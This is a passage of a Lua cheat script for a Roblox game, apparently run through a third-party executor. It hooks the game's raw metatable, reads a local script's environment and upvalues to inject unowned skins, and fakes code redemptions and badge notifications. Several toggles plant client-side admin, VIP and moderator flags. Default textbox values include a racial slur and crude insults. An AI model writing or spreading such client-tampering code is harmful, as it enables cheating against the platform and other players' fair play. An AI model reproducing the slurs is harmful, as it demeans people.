            if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        else
            if IsA(V, "TextLabel") or IsA(V, "TextButton") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end)
end

if Config.UseMetatableHook then
    if not getrawmetatable then
        error("GetRawMetaTable not found")
    end

    local NewCC = function(F)
        if newcclosure then return newcclosure(F) end
        return F
    end

    local SetRO = function(MT, V)
        if setreadonly then return setreadonly(MT, V) end
        if not V and make_writeable then return make_writeable(MT) end
        if V and make_readonly then return make_readonly(MT) end
        error("No setreadonly found")
    end

    local MT = getrawmetatable(game)
    local OldNewIndex = MT.__newindex
    SetRO(MT, false)

    MT.__newindex = NewCC(function(T, K, V)
        if Config.RenameTextBoxes then
            if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        else
            if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        end

        return OldNewIndex(T, K, V)
    end)

    SetRO(MT, true)
    end
end)
local skinToReceive = "Monky"
local code = "SuperFart"

k6Sec:AddTextbox("Valid Code", "NiggaBeater69", function(State)
    code = State
end)

k6Sec:AddTextbox("SkinOnRedeem", "Monky", function(State)
    skinToReceive = State
end)

k6Sec:AddButton("AntiInvalidCodeExploit", function(x)
    
    local clone = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Codes.CodesNew.Redeem:Clone()
    game:GetService("Players").LocalPlayer.PlayerGui.Menew.Codes.CodesNew.Redeem:Destroy()

    clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Codes.CodesNew
    clone.Visible = true
    clone.Name = "Redeem"
    clone.MouseButton1Click:Connect(function()
        if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Menew.Codes.CodesNew.Input.TextBox.Text, code) then
            clone.TextLabel.Text = "Code Redeemed!"
            task.wait(1)
            clone.TextLabel.Text = "Redeem"
            local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);

            local Loadout;
            for i,v in pairs(getupvalues(Core.ViewItems)) do
                if typeof(v) == "table" then
                    if v.Skins then
                        Loadout = v;
                    end
                end
            end
            
            table.insert(Loadout.Skins, skinToReceive);
            
            game.Players.LocalPlayer.Data.Skin.Value = skinToReceive
            
              local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);
        
            local Loadout;
            for i,v in pairs(getupvalues(Core.ViewItems)) do
                if typeof(v) == "table" then
                    if v.Skins then
                        Loadout = v;
                    end
                end
            end
            
            table.insert(Loadout.Skins, skinToReceive);
            
            game.Players.LocalPlayer.Data.Skin.Value = skinToReceive
            
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://1585231427"
            sound:Play()
         
            local service = game:GetService("SoundService")
            service:PlayLocalSound(sound)
         
            local charModel = workspace:FindFirstChild(game.Players.LocalPlayer.Data.Skin.Value)
         
            local equipAnim = Instance.new("Animation")
            equipAnim.AnimationId = "rbxassetid://895992153"
         
            local anim = charModel.Humanoid:LoadAnimation(equipAnim)
            anim:Play()
        else
            clone.TextLabel.Text = "Code Doesn't Exist"
            task.wait(1)
            clone.TextLabel.Text = "Redeem"
        end

    end) 
end)

k8Sec:AddButton("Megaphone To Movin' Megaphone", function(x)
    
    game:GetService("ReplicatedStorage").Taunts.Megaphone["end"].AnimationId = 'rbxassetid://2805054405'
    game:GetService("ReplicatedStorage").Taunts.Megaphone["action"].AnimationId = 'rbxassetid://2804019904'
    game:GetService("ReplicatedStorage").Taunts.Megaphone["start"].AnimationId = 'rbxassetid://2736758964'
    game:GetService("ReplicatedStorage").Taunts.Megaphone["idle"].AnimationId = 'rbxassetid://2596580624'
    game:GetService("ReplicatedStorage").Taunts.Megaphone.NoMovement:Destroy()
    game:GetService("ReplicatedStorage").Taunts.Megaphone.NoAction:Destroy()    
end)

local badgeName = "Fat Shit"

k7Sec:AddTextbox("Badge Name", "Fat Shit", function(State)
    badgeName = State
end)

k7Sec:AddButton("Get Badge", function(x)
    game.StarterGui:SetCore("SendNotification", {
                Title = "Badge Awarded",
                Text = game.Players.LocalPlayer.Name .. "  Won ROLVe Community's "..'"'..badgeName..'"'..' award!',
                Icon = "rbxassetid://206410289"
    })
end)

k5Sec:AddToggle("IsChad", false, function(x)
    if game.Players.LocalPlayer:FindFirstChild('IsChad') then
        game.Players.LocalPlayer.IsChad:Destroy()
        return
    end
    
        if x then

    
    local IsMod = Instance.new('IntValue', game.Players.LocalPlayer)
    IsMod.Name = "IsChad"
    end
    --if game.Players.LocalPlayer:FindFirstChild('IsAdmin') then
 --       game.Players.LocalPlayer.IsAdmin:Destroy()
  --  end
end)

k5Sec:AddToggle("VIP", false, function(x)
    if game.Players.LocalPlayer:FindFirstChild('VIP') then
        game.Players.LocalPlayer.VIP:Destroy()
        return
    end
    
    if x then
    local IsMod = Instance.new('IntValue', game.Players.LocalPlayer)
    IsMod.Name = "VIP"
    end
    --if game.Players.LocalPlayer:FindFirstChild('IsAdmin') then
 --       game.Players.LocalPlayer.IsAdmin:Destroy()
  --  end
end)

k5Sec:AddToggle("OldVIP", false, function(x)
    if game.Players.LocalPlayer:FindFirstChild('OldVIP') then
        game.Players.LocalPlayer.OldVIP:Destroy()
        return
    end
        if x then
    local IsMod = Instance.new('IntValue', game.Players.LocalPlayer)
    IsMod.Name = "OldVIP"
    end
    --if game.Players.LocalPlayer:FindFirstChild('IsAdmin') then
 --       game.Players.LocalPlayer.IsAdmin:Destroy()
  --  end
end)
k5Sec:AddToggle("Romin", false, function(x)
    if game.Players.LocalPlayer:FindFirstChild('Romin') then
        game.Players.LocalPlayer.Romin:Destroy()
        return
    end
        if x then

    local IsAdmin = Instance.new('IntValue', game.Players.LocalPlayer)
    IsAdmin.Name = "Romin"
    end
    
end)

k5Sec:AddToggle("IsAdmin", false, function(x)
    if game.Players.LocalPlayer:FindFirstChild('IsAdmin') then
        game.Players.LocalPlayer.IsAdmin:Destroy()
        return
    end
        if x then

    local IsAdmin = Instance.new('IntValue', game.Players.LocalPlayer)
    IsAdmin.Name = "IsAdmin"
    end
    
end)

k4Sec:AddButton("xonae (skin)",function(x)
    local Cframe=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    game:GetObjects("rbxassetid://8755777316")[1].Parent = workspace;
    for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Shirt") or v:IsA("Pants") then
            v:Destroy()
        end
    end
    
    for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") then
            v:Destroy()
        end
    end
    
    for _, v in pairs(workspace.xonae:GetChildren()) do
        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Accessory") then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end
    
    
    local newHum=workspace.xonae.Humanoid:Clone()
    newHum.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    newHum:Destroy()
    workspace.xonae:Destroy()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=Cframe;
    
    for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("MeshPart") or v:IsA("Part") then
            if v.Name=="Head"or(v.Name=="FakeHead")then
                v.Color = Color3.fromRGB(255,255,255)    
            end
            
            if (v.Name=="RightUpperArm")or(v.Name=="RightLowerArm")or(v.Name=="LeftUpperArm")or(v.Name=="LeftLowerArm")then
                v.Color = Color3.fromRGB(255,255,255)    
            end
        end
    end
    
    game.Players.LocalPlayer.Data.Skin.Value="Bacon";
end)

k4Sec:AddButton("Merry Monky (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Froggy"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Monky"
    
    Loader.RequestAssets({'Froggy', 'Monky', 'Merry Singer'}, "ChrModels")

    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Froggy") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Monky")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    --local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Delinquent That's Cool"].ClockworksShades:Clone()
    --clone.Parent = game.Players.LocalPlayer.Character
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
    local RagdollHat = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    RagdollHat.Parent = game.Players.LocalPlayer.Character
    
    local RagdollC = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["Holiday Skirt"]:Clone()
    RagdollC.Parent = game.Players.LocalPlayer.Character
    
    local RagdollA = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["Singer_Cap"]:Clone()
    RagdollA.Parent = game.Players.LocalPlayer.Character
    
    --local RagdollB = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["LongSideSweep"]:Clone()
    --RagdollB.Parent = game.Players.LocalPlayer.Character
    
    local RagdollV = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["Neck_Fluff"]:Clone()
    RagdollV.Parent = game.Players.LocalPlayer.Character
    local RagdollN = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["WristFluff_R"]:Clone()
    RagdollN.Parent = game.Players.LocalPlayer.Character
    
    local RagdollN = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["WristFluff_L"]:Clone()
    RagdollN.Parent = game.Players.LocalPlayer.Character
    
    for __, vls in pairs(game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]:GetChildren()) do
        if vls.Name == "Mantle" then
            vls.Parent =  game.Players.LocalPlayer.Character   
        end
    end
    
    local c23 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Shirt:Clone()
    c23.Parent = game.Players.LocalPlayer.Character
    
    local c234 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Pants:Clone()
    c234.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    clone4:Destroy()
    
    --[[local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    ]]
    
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    


    
    

end)


k4Sec:AddButton("Merry Rabblerouser (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Froggy"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Delinquent That's Cool" -- cool vm arms
    
    Loader.RequestAssets({'Myra', 'Rabblerouser', "Delinquent That's Cool", 'Snow Queen'}, "ChrModels")
    -- snow queen for shirt
    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Myra") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Rabblerouser")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    --local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Delinquent That's Cool"].ClockworksShades:Clone()
    --clone.Parent = game.Players.LocalPlayer.Character
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   game.Players.LocalPlayer.Character.LongPonytail:Destroy()  --I added this
   -- game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.LongPonytail:Destroy()
    --game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
    local RagdollHat = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myra.Myra_Hat:Clone()
    RagdollHat.Parent = game.Players.LocalPlayer.Character
    
    local RagdollC = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Myra"]["Myra_Hair"]:Clone()
    RagdollC.Parent = game.Players.LocalPlayer.Character
    

    
    --local RagdollB = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Merry Singer"]["LongSideSweep"]:Clone()
    --RagdollB.Parent = game.Players.LocalPlayer.Character
    
    
    
    local c23 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Snow Queen"].Shirt:Clone()
    c23.Parent = game.Players.LocalPlayer.Character
    
    local c234 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Snow Queen"].Pants:Clone()
    c234.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myra.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    clone4:Destroy()
    
    --[[local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    ]]
    
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    


    
    
end)



k4Sec:AddButton("Fronky (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Froggy"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Froggy"
    
    Loader.RequestAssets({'Froggy', 'Monky'}, "ChrModels")

    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Froggy") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Monky")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    --local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Delinquent That's Cool"].ClockworksShades:Clone()
    --clone.Parent = game.Players.LocalPlayer.Character
            local RagdollBananaRod34 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy["Funnylittlefrog"]:Clone()
    RagdollBananaRod34.Parent = game.Players.LocalPlayer.Character
    
        local RagdollBananaRod344 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy["Funnylittlefrog"]:Clone()
    RagdollBananaRod344.Parent = game.Players.LocalPlayer.Ragdoll
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
        local RagdollHat = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    RagdollHat.Parent = game.Players.LocalPlayer.Character
    
    local c23 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Shirt:Clone()
    c23.Parent = game.Players.LocalPlayer.Character
    
    local c234 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Pants:Clone()
    c234.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    clone4:Destroy()
    
    --[[local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    ]]
    
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    


    
    
end)


k4Sec:AddButton("Monkboe (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Monky"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Myboe"
    
    Loader.RequestAssets({'Monky', 'Myboe'}, "ChrModels")

    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Monky") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Myboe")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    clone.Parent = game.Players.LocalPlayer.Character
    
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   -- game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    --game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
    local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    
    
    local Ragdollpants = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    Ragdollpants.Parent = game.Players.LocalPlayer.Ragdoll
    
    local Ragdollshirt = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    Ragdollshirt.Parent = game.Players.LocalPlayer.Ragdoll
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    

        local RagdollBananaRod34 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe["Bowler"]:Clone()
    RagdollBananaRod34.Parent = game.Players.LocalPlayer.Character
    
        local RagdollBananaRod344 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe["Bowler"]:Clone()
    RagdollBananaRod344.Parent = game.Players.LocalPlayer.Ragdoll
    
    local RagdollHat = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    RagdollHat.Parent = game.Players.LocalPlayer.Ragdoll
end)

k4Sec:AddButton("Bacon That's Cool (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Monky"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Bacon"
    
    Loader.RequestAssets({'Bacon', "Delinquent That's Cool"}, "ChrModels")

    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Bacon") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Delinquent That's Cool")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Delinquent That's Cool"].ClockworksShades:Clone()
    clone.Parent = game.Players.LocalPlayer.Character
            local RagdollBananaRod34 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Bacon["Pal Hair"]:Clone()
    RagdollBananaRod34.Parent = game.Players.LocalPlayer.Character
    
        local RagdollBananaRod344 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Bacon["Pal Hair"]:Clone()
    RagdollBananaRod344.Parent = game.Players.LocalPlayer.Ragdoll
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    game.Players.LocalPlayer.Character.FakeHead.face:Destroy()
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    --game.Players.LocalPlayer.Character["Body Colors"]:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    game.Players.LocalPlayer.Character.FakeHead.Color = Color3.fromRGB(205, 205, 205);
    
    local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Bacon"].Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local face=game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Bacon"].Head.face:Clone()
    face.Parent = game.Players.LocalPlayer.Character.FakeHead
    
    local clone5 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Bacon"].Pants:Clone()
    clone5.Parent = game.Players.LocalPlayer.Character
    
    --local clone54 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Bacon"]["Body Colors"]:Clone()
    --clone54.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Bacon.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    clone4:Destroy()
    
    --[[local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    ]]
    
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    


    
    
end)

k4Sec:AddButton("Defrogquent (skin)", function(x)
     
    
    game.Players.LocalPlayer.Data.Skin.Value = "Monky"
    

    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Segg with Drip"
    
    Loader.RequestAssets({'Froggy', "Delinquent That's Cool", 'Segg with Drip'}, "ChrModels")

    
    repeat task.wait() until game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Froggy") and game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild("Delinquent That's Cool")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Shirt") and game.Players.LocalPlayer.Character:FindFirstChild("Pants")
    repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer:FindFirstChild("Ragdoll")
    local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Delinquent That's Cool"].ClockworksShades:Clone()
    clone.Parent = game.Players.LocalPlayer.Character
            local RagdollBananaRod34 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy["Funnylittlefrog"]:Clone()
    RagdollBananaRod34.Parent = game.Players.LocalPlayer.Character
    
        local RagdollBananaRod344 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy["Funnylittlefrog"]:Clone()
    RagdollBananaRod344.Parent = game.Players.LocalPlayer.Ragdoll
    --local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
   game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
    local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Segg with Drip"].Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local new_instance = Instance.new("Pants", game.Players.LocalPlayer.Character)
    new_instance.PantsTemplate = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels["Segg with Drip"].Shirt.ShirtTemplate
    new_instance.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Froggy.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    task.wait(1)
    clone4:Destroy()
    
    --[[local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Myboe.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    ]]
    
    
    --local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    --RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    


    
    
end)
k4Sec:AddButton("Darkheart", function(x)
    game.ReplicatedStorage["Viewmodels"]["v_Dagger"].Name = "fafwerwerewrw"
